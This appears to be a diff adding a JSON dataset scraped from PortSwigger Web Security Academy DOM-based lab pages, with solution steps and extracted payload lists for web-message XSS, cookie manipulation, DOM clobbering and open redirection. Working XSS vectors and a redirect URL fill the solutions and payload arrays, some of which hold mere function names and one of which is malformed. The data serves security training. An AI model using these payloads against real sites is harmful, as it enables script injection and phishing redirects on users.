@@ -1,0 +1,152 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages",
+    "category": "dom-based",
+    "title": "DOM XSS using web messages",
+    "description": "This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes theprint()function to be called.",
+    "solution_steps": [
+      "Notice that the home page contains an addEventListener() call that listens for a web message.",
+      "Go to the exploit server and add the following iframe to the body. Remember to add your own lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('<img src=1 onerror=print()>','*')\">",
+      "Store the exploit and deliver it to the victim."
+    ],
+    "solution": "1. Notice that the home page contains an addEventListener() call that listens for a web message.\n2. Go to the exploit server and add the following iframe to the body. Remember to add your own lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('<img src=1 onerror=print()>','*')\">\n3. Store the exploit and deliver it to the victim.",
+    "payloads": [
+      "print()",
+      "addEventListener()",
+      "iframe",
+      "<iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('<img src=1 onerror=print()>','*')\">",
+      "postMessage()",
+      "onerror"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url",
+    "category": "dom-based",
+    "title": "DOM XSS using web messages and a JavaScript URL",
+    "description": "This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls theprint()function.",
+    "solution_steps": [
+      "Notice that the home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings \"http:\" or \"https:\" anywhere within the web message. It also contains the sink location.href .",
+      "Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('javascript:print()//http:','*')\">",
+      "Store the exploit and deliver it to the victim."
+    ],
+    "solution": "1. Notice that the home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings \"http:\" or \"https:\" anywhere within the web message. It also contains the sink location.href .\n2. Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('javascript:print()//http:','*')\">\n3. Store the exploit and deliver it to the victim.",
+    "payloads": [
+      "print()",
+      "addEventListener()",
+      "indexOf()",
+      "\"http:\"",
+      "\"https:\"",
+      "location.href",
+      "iframe",
+      "YOUR-LAB-ID",
+      "<iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('javascript:print()//http:','*')\">",
+      "targetOrigin",
+      "postMessage()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse",
+    "category": "dom-based",
+    "title": "DOM XSS using web messages andJSON.parse",
+    "description": "This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls theprint()function.",
+    "solution_steps": [
+      "Notice that the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using JSON.parse() . In the JavaScript, we can see that the event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute.",
+      "Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage(\"{\\\"type\\\":\\\"load-channel\\\",\\\"url\\\":\\\"javascript:print()\\\"}\",\"*\")'>",
+      "Store the exploit and deliver it to the victim."
+    ],
+    "solution": "1. Notice that the home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using JSON.parse() . In the JavaScript, we can see that the event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute.\n2. Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage(\"{\\\"type\\\":\\\"load-channel\\\",\\\"url\\\":\\\"javascript:print()\\\"}\",\"*\")'>\n3. Store the exploit and deliver it to the victim.",
+    "payloads": [
+      "JSON.parse",
+      "print()",
+      "JSON.parse()",
+      "type",
+      "load-channel",
+      "switch",
+      "iframe src",
+      "iframe",
+      "YOUR-LAB-ID",
+      "<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage(\"{\\\"type\\\":\\\"load-channel\\\",\\\"url\\\":\\\"javascript:print()\\\"}\",\"*\")'>",
+      "postMessage()",
+      "ACMEplayer.element",
+      "targetOrigin"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation",
+    "category": "dom-based",
+    "title": "DOM-based cookie manipulation",
+    "description": "This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call theprint()function. You will need to use the exploit server to direct the victim to the correct pages.",
+    "solution_steps": [
+      "Notice that the home page uses a client-side cookie called lastViewedProduct , whose value is the URL of the last product page that the user visited.",
+      "Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>\" onload=\"if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;\">",
+      "Store the exploit and deliver it to the victim."
+    ],
+    "solution": "1. Notice that the home page uses a client-side cookie called lastViewedProduct , whose value is the URL of the last product page that the user visited.\n2. Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>\" onload=\"if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;\">\n3. Store the exploit and deliver it to the victim.",
+    "payloads": [
+      "print()",
+      "lastViewedProduct",
+      "iframe",
+      "YOUR-LAB-ID",
+      "<iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>\" onload=\"if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;\">",
+      "onload"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters",
+    "category": "dom-based",
+    "title": "Clobbering DOM attributes to bypass HTML filters",
+    "description": "This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls theprint()function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.",
+    "solution_steps": [
+      "Go to one of the blog posts and create a comment containing the following HTML: <form id=x tabindex=0 onfocus=print()><input id=attributes>",
+      "Go to the exploit server and add the following iframe to the body: <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload=\"setTimeout(()=>this.src=this.src+'#x',500)\"> Remember to change the URL to contain your lab ID and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step.",
+      "Store the exploit and deliver it to the victim. The next time the page loads, the print() function is called."
+    ],
+    "solution": "1. Go to one of the blog posts and create a comment containing the following HTML: <form id=x tabindex=0 onfocus=print()><input id=attributes>\n2. Go to the exploit server and add the following iframe to the body: <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload=\"setTimeout(()=>this.src=this.src+'#x',500)\"> Remember to change the URL to contain your lab ID and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step.\n3. Store the exploit and deliver it to the victim. The next time the page loads, the print() function is called.",
+    "payloads": [
+      "print()",
+      "<form id=x tabindex=0 onfocus=print()><input id=attributes>",
+      "iframe",
+      "<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload=\"setTimeout(()=>this.src=this.src+'#x',500)\">",
+      "postId",
+      "attributes",
+      "form",
+      "onfocus"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering",
+    "category": "dom-based",
+    "title": "Exploiting DOM clobbering to enable XSS",
+    "description": "This lab contains a DOM-clobbering vulnerability. The comment functionality allows \"safe\" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call thealert()function.",
+    "solution_steps": [
+      "Go to one of the blog posts and create a comment containing the following anchors: <a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">",
+      "Return to the blog post and create a second comment containing any random text. The next time the page loads, the alert() is called."
+    ],
+    "solution": "1. Go to one of the blog posts and create a comment containing the following anchors: <a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">\n2. Return to the blog post and create a second comment containing any random text. The next time the page loads, the alert() is called.",
+    "payloads": [
+      "alert()",
+      "<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\">",
+      "loadCommentsWithDomClobbering.js",
+      "let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}",
+      "defaultAvatar",
+      "name",
+      "\"avatar\"",
+      "avatar",
+      "href",
+      "cid:",
+      "{avatar: \u2018cid:\"onerror=alert(1)//\u2019}",
+      "onerror"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection",
+    "category": "dom-based",
+    "title": "DOM-based open redirection",
+    "description": "This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.",
+    "solution": "The blog post page contains the following link, which returns to the home page of the blog:\n<a href='#' onclick='returnURL' = /url=https?:\\/\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = \"/\"'>Back to Blog</a>\nThe\nurl\nparameter contains an open redirection vulnerability that allows you to change where the \"Back to Blog\" link takes the user. To solve the lab, construct and visit the following URL, remembering to change the URL to contain your lab ID and your exploit server ID:\nhttps://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/",
+    "payloads": [
+      "<a href='#' onclick='returnURL' = /url=https?:\\/\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = \"/\"'>Back to Blog</a>",
+      "https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/"
+    ]
+  }
+]
